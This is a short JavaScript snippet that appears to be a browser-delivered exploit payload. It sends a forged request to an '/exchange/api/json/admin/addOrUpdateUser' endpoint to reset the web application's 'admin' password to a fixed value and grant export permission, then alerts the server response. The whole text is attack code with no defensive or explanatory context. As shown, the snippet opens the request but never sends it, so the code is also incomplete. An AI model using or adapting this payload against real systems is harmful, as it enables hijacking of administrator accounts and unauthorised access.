function resetAdminPass() {
	var queryParams = "%7B%22userType%22%3A%22ERPUser%22%2C%22roleName%22%3A%22Admin%22%2C%22userName%22%3A%22admin%22%2C%22password%22%3A%22AccessBreak%40123%22%2C%22cnfPassword%22%3A%22AccessBreak%40123%22%2C%22editPassword%22%3Atrue%2C%22exportPermission%22%3Atrue%2C%22operation%22%3A%22modify%22%2C%22loginId%22%3A1%7D";
	
	
	var resetPassReq = new XMLHttpRequest();
	resetPassReq.open('POST', '/exchange/api/json/admin/addOrUpdateUser', true);
	resetPassReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded;charset=UTF-8');
	
	resetPassReq.onload = function () {
		var resp = (JSON.stringify(this.responseText));
		alert(resp);				
	};
}
 resetAdminPass();
